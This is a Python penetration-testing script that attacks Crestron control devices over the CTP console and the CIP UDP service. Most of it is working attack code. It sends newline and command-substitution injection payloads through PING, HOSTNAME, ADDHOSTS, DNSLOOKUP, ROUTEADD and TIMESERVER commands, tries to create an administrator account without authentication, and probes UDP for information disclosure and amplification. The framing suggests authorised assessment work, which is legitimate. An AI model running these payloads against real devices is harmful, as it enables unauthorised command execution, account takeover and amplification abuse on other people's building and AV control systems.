#!/usr/bin/env python3
"""
Crestron CTP Command Injection Tester
Phase 2/3: Test CTP console commands for command injection vulnerabilities

Based on binary RE findings:
- validateCharacters() blocks: <>&|;$`  (7 chars only)
- NOT blocked: \n " () \\ # ! {} [] ~ % + = ? : , * -
- PING has additional gates: single-quote check + IsValidServer hostname allowlist
- Other commands may ONLY use validateCharacters() without IsValidServer

Attack vectors:
1. Newline injection (\n) to terminate ping command and start new one
2. Parentheses/subshell $() - but $ is blocked
3. Double quote injection
4. Backtick blocked, but command substitution via other means
5. Hash (#) comment injection to disable rest of command

Target commands to test:
- PING (most validated - 3 layers)
- HOSTNAME (may be weaker)
- ADDHOSTS (writes to hosts file)
- ROUTEADD (routing table modification)
- SNTP server configuration
"""

import sys
import os
import time
import socket

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from crestron_common import CTPClient, EvidenceCollector


def test_ctp_commands(host, port=41795):
    """Test CTP commands for injection vulnerabilities."""
    ec = EvidenceCollector("ctp_injection_tester")

    print(f"[*] Connecting to CTP at {host}:{port}")

    try:
        ctp = CTPClient(host, port)
        banner = ctp.connect()
        print(f"[+] Connected. Banner: {repr(banner[:200])}")
        ec.add_test("CTP-000", "CTP connection and banner", f"TCP connect {host}:{port}", banner)

        # === Phase 1: Enumerate device info ===
        print("\n[*] Phase 1: Device Enumeration")
        info_commands = [
            ("CTP-001", "VER", "Device version/firmware info"),
            ("CTP-002", "HOSTNAME", "Current hostname"),
            ("CTP-003", "ICONFIG", "Interface configuration"),
            ("CTP-004", "SHOWHW", "Hardware info"),
            ("CTP-005", "AUTH", "Authentication status"),
            ("CTP-006", "WEBSERVER", "Web server status"),
            ("CTP-007", "SNMP", "SNMP configuration"),
            ("CTP-008", "SSHPORT", "SSH port status"),
            ("CTP-009", "TELNETPORT", "Telnet port status"),
            ("CTP-010", "FTPSERVER", "FTP server status"),
            ("CTP-011", "ENABLEFEATURE", "Feature flags"),
            ("CTP-012", "LISTUSERS", "List user accounts"),
            ("CTP-013", "CIPPORT", "CIP port configuration"),
        ]

        for test_id, cmd, desc in info_commands:
            try:
                resp = ctp.send_command(cmd, wait=1.5)
                print(f"  [{test_id}] {cmd}: {resp[:100].strip()}")
                ec.add_test(test_id, desc, cmd, resp)
            except Exception as e:
                ec.add_test(test_id, desc, cmd, f"ERROR: {e}", status="ERROR")

        # === Phase 2: Test validateCharacters bypass ===
        print("\n[*] Phase 2: validateCharacters() Bypass Testing")
        print("    Blocklist: <>&|;$`")
        print("    Testing characters NOT in blocklist...")

        # Characters NOT blocked by validateCharacters()
        # These should pass the first validation gate
        bypass_chars = {
            "newline": "\n",
            "double_quote": '"',
            "open_paren": "(",
            "close_paren": ")",
            "backslash": "\\",
            "hash": "#",
            "exclamation": "!",
            "open_brace": "{",
            "close_brace": "}",
            "open_bracket": "[",
            "close_bracket": "]",
            "tilde": "~",
            "percent": "%",
            "plus": "+",
            "equals": "=",
            "question": "?",
            "colon": ":",
            "comma": ",",
            "asterisk": "*",
            "at_sign": "@",
            "caret": "^",
            "tab": "\t",
            "space": " ",
        }

        # Test each unblocked character in PING command
        # PING has: validateCharacters → single-quote check → StringParseArgs → IsValidServer
        # We expect most to be caught by IsValidServer (only allows [a-zA-Z0-9.-])
        # But the error message will tell us which gate caught it
        for name, char in bypass_chars.items():
            test_id = f"CTP-BYPASS-{name}"
            # Construct injection: a valid-looking hostname with the special char
            # Goal: see if validateCharacters passes it (error msg differs)
            payload = f"[REDACTED-IP]{char}whoami"
            cmd = f"PING {payload}"
            try:
                resp = ctp.send_command(cmd, wait=2.0)
                resp_clean = resp.strip()

                # Analyze which gate caught it
                if "Invalid Character" in resp_clean:
                    gate = "validateCharacters"
                elif "Invalid IP" in resp_clean or "Invalid server" in resp_clean:
                    gate = "IsValidServer"
                elif "ERROR" in resp_clean.upper():
                    gate = "other_error"
                elif any(x in resp_clean for x in ["bytes from", "PING", "packets transmitted", "ttl="]):
                    gate = "EXECUTED"
                    ec.add_finding(test_id, "CRITICAL",
                                 f"PING injection bypass via {name} ({repr(char)})",
                                 f"Command: {repr(cmd)}\nResponse: {resp_clean[:500]}")
                else:
                    gate = "unknown"
                    ec.add_anomaly(test_id, f"Unexpected response for {name}: {resp_clean[:200]}")

                print(f"  [{test_id}] char={repr(char)} gate={gate} resp={resp_clean[:80]}")
                ec.add_test(test_id, f"PING bypass with {name} ({repr(char)})", cmd, resp_clean,
                           status="CRITICAL" if gate == "EXECUTED" else "INFO")
            except Exception as e:
                ec.add_test(test_id, f"PING bypass with {name}", cmd, f"ERROR: {e}", status="ERROR")

        # === Phase 3: Newline injection (most promising) ===
        print("\n[*] Phase 3: Newline Injection Testing")
        # If \n passes validateCharacters AND StringParseArgs doesn't strip it,
        # the snprintf'd command becomes: "ping [REDACTED-IP]\nwhoami"
        # When popen'd, the shell treats \n as a command separator
        newline_payloads = [
            ("NL-001", "[REDACTED-IP]\nid", "Basic newline injection"),
            ("NL-002", "[REDACTED-IP]\npwd", "Newline with pwd"),
            ("NL-003", "127.0.0.1\ncat /etc/hostname", "Newline with cat"),
            ("NL-004", "-c 1 127.0.0.1\nid", "Newline after valid ping args"),
        ]

        for test_id, payload, desc in newline_payloads:
            cmd = f"PING {payload}"
            try:
                resp = ctp.send_command(cmd, wait=3.0)
                resp_clean = resp.strip()
                # Check if we see output from injected command
                injection_indicators = ["uid=", "root", "/home", "/root", "/opt",
                                       "DIN-AP", "TSW-", "MC3-", "CP3-"]
                injected = any(ind in resp_clean for ind in injection_indicators)

                if injected:
                    ec.add_finding(test_id, "CRITICAL",
                                 f"CTP PING newline injection: {desc}",
                                 f"Payload: {repr(payload)}\nResponse: {resp_clean[:500]}")
                    print(f"  [!!!] [{test_id}] INJECTION DETECTED: {resp_clean[:200]}")
                else:
                    print(f"  [{test_id}] {desc}: {resp_clean[:100]}")

                ec.add_test(test_id, desc, repr(cmd), resp_clean,
                           status="CRITICAL" if injected else "INFO")
            except Exception as e:
                ec.add_test(test_id, desc, repr(cmd), f"ERROR: {e}", status="ERROR")

        # === Phase 4: Test other CTP commands (may have weaker validation) ===
        print("\n[*] Phase 4: Other CTP Command Injection Testing")
        other_commands = [
            # HOSTNAME command - sets hostname, may use validateCharacters only
            ("CMD-HOST-001", 'HOSTNAME test$(id)', "HOSTNAME command substitution"),
            ("CMD-HOST-002", 'HOSTNAME test"$(id)"', "HOSTNAME double-quote wrapped"),
            ("CMD-HOST-003", 'HOSTNAME test\nid', "HOSTNAME newline injection"),

            # ADDHOSTS - adds entry to /etc/hosts
            ("CMD-HOSTS-001", 'ADDHOSTS 127.0.0.1 test$(id)', "ADDHOSTS command substitution"),
            ("CMD-HOSTS-002", 'ADDHOSTS 127.0.0.1 test\nid', "ADDHOSTS newline injection"),

            # DNSLOOKUP - performs DNS lookup
            ("CMD-DNS-001", 'DNSLOOKUP test.com\nid', "DNSLOOKUP newline injection"),
            ("CMD-DNS-002", 'DNSLOOKUP test.com$(id)', "DNSLOOKUP command substitution"),

            # ROUTEADD - adds routes
            ("CMD-ROUTE-001", 'ROUTEADD 0.0.0.0 0.0.0.0 127.0.0.1\nid', "ROUTEADD newline injection"),

            # SNTP commands
            ("CMD-SNTP-001", 'TIMESERVER test.com\nid', "TIMESERVER newline injection"),
        ]

        for test_id, cmd, desc in other_commands:
            try:
                resp = ctp.send_command(cmd, wait=2.0)
                resp_clean = resp.strip()
                injection_indicators = ["uid=", "root", "/home", "/root", "/opt"]
                injected = any(ind in resp_clean for ind in injection_indicators)

                if injected:
                    ec.add_finding(test_id, "CRITICAL",
                                 f"CTP command injection: {desc}",
                                 f"Command: {repr(cmd)}\nResponse: {resp_clean[:500]}")
                    print(f"  [!!!] [{test_id}] INJECTION DETECTED!")

                print(f"  [{test_id}] {cmd[:40]}: {resp_clean[:100]}")
                ec.add_test(test_id, desc, repr(cmd), resp_clean,
                           status="CRITICAL" if injected else "INFO")
            except Exception as e:
                ec.add_test(test_id, desc, repr(cmd), f"ERROR: {e}", status="ERROR")

        # === Phase 5: Authentication bypass testing ===
        print("\n[*] Phase 5: Authentication Status Check")
        # Check if we can run privileged commands without auth
        priv_commands = [
            ("AUTH-001", "ADDUSER testcf:password:Administrators", "Add admin user without auth"),
            ("AUTH-002", "REBOOT", "Reboot without auth"),
            ("AUTH-003", "RESTORE", "Factory restore without auth"),
        ]

        for test_id, cmd, desc in priv_commands:
            try:
                # Don't actually send REBOOT or RESTORE
                if cmd in ("REBOOT", "RESTORE"):
                    ec.add_test(test_id, desc, cmd, "SKIPPED - destructive command", status="SKIPPED")
                    print(f"  [{test_id}] {cmd}: SKIPPED (destructive)")
                    continue

                resp = ctp.send_command(cmd, wait=2.0)
                resp_clean = resp.strip()
                if "ERROR" in resp_clean.upper() or "denied" in resp_clean.lower() or "not authorized" in resp_clean.lower():
                    print(f"  [{test_id}] {cmd}: BLOCKED ({resp_clean[:80]})")
                else:
                    ec.add_finding(test_id, "HIGH",
                                 f"CTP privileged command without auth: {desc}",
                                 f"Command: {cmd}\nResponse: {resp_clean[:500]}")
                    print(f"  [!] [{test_id}] {cmd}: ALLOWED! {resp_clean[:80]}")

                ec.add_test(test_id, desc, cmd, resp_clean)
            except Exception as e:
                ec.add_test(test_id, desc, cmd, f"ERROR: {e}", status="ERROR")

        ctp.close()

    except ConnectionRefusedError:
        print(f"[-] Connection refused to {host}:{port}")
        ec.add_test("CTP-ERR", "Connection failed", f"TCP connect {host}:{port}",
                    "Connection refused", status="ERROR")
    except socket.timeout:
        print(f"[-] Connection timed out to {host}:{port}")
        ec.add_test("CTP-ERR", "Connection failed", f"TCP connect {host}:{port}",
                    "Timeout", status="ERROR")
    except Exception as e:
        print(f"[-] Error: {e}")
        ec.add_test("CTP-ERR", "Unexpected error", str(type(e)), str(e), status="ERROR")

    ec.save()
    return ec


def test_cip_udp_probe(host, port=41794):
    """Test CIP UDP discovery (unauthenticated info disclosure)."""
    ec = EvidenceCollector("cip_udp_probe")

    print(f"\n[*] CIP UDP Probe: {host}:{port}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)

    try:
        # Standard discovery probe
        sock.sendto(b'\x14', (host, port))
        data, addr = sock.recvfrom(4096)

        print(f"[+] Response: {len(data)} bytes from {addr}")
        print(f"    Hex (first 64): {data[:64].hex()}")

        # Parse response
        from crestron_common import parse_udp_response
        parsed = parse_udp_response(data)
        if parsed:
            print(f"    Hostname: {parsed.get('hostname', 'N/A')}")
            print(f"    Version: {parsed.get('version', 'N/A')}")

        ec.add_test("CIP-UDP-001", "CIP UDP discovery probe",
                    "Send 0x14 to UDP 41794",
                    f"Response: {len(data)} bytes, {data.hex()[:100]}...")
        ec.add_finding("CIP-UDP-INFO", "MEDIUM",
                      "CIP UDP Information Disclosure",
                      f"Unauthenticated UDP probe reveals hostname and firmware version.\n"
                      f"Hostname: {parsed.get('hostname', 'N/A')}\n"
                      f"Version: {parsed.get('version', 'N/A')}\n"
                      f"Response size: {len(data)} bytes (15x amplification from 1-byte request)")

        # Test with different probe bytes
        for probe_byte in [0x00, 0x01, 0x02, 0x05, 0x0D, 0x0F, 0x15, 0xFF]:
            try:
                sock.sendto(bytes([probe_byte]), (host, port))
                resp, _ = sock.recvfrom(4096)
                ec.add_test(f"CIP-UDP-{probe_byte:02X}", f"UDP probe byte 0x{probe_byte:02X}",
                           f"Send 0x{probe_byte:02X}", f"{len(resp)} bytes: {resp.hex()[:60]}")
                print(f"    Probe 0x{probe_byte:02X}: {len(resp)} bytes")
            except socket.timeout:
                ec.add_test(f"CIP-UDP-{probe_byte:02X}", f"UDP probe byte 0x{probe_byte:02X}",
                           f"Send 0x{probe_byte:02X}", "No response (timeout)")
    except socket.timeout:
        print("[-] No UDP response (timeout)")
        ec.add_test("CIP-UDP-001", "CIP UDP discovery probe",
                    "Send 0x14 to UDP 41794", "No response (timeout)", status="INFO")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        sock.close()

    ec.save()
    return ec


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_host> [ctp_port] [--udp-only] [--ctp-only]")
        print()
        print("Tests CTP console commands for command injection and")
        print("CIP UDP for information disclosure/amplification.")
        print()
        print("Examples:")
        print(f"  {sys.argv[0]} [REDACTED-INTERNAL-IP]")
        print(f"  {sys.argv[0]} [REDACTED-INTERNAL-IP] --udp-only")
        print(f"  {sys.argv[0]} [REDACTED-INTERNAL-IP] 41795 --ctp-only")
        sys.exit(1)

    target = sys.argv[1]
    ctp_port = 41795
    udp_only = "--udp-only" in sys.argv
    ctp_only = "--ctp-only" in sys.argv

    for arg in sys.argv[2:]:
        if arg.isdigit():
            ctp_port = int(arg)

    print("=" * 60)
    print("Crestron CTP/CIP Security Assessment")
    print(f"Target: {target}")
    print("=" * 60)

    if not ctp_only:
        test_cip_udp_probe(target)

    if not udp_only:
        test_ctp_commands(target, ctp_port)

    print("\n[*] Assessment complete. Check evidence/ directory for results.")
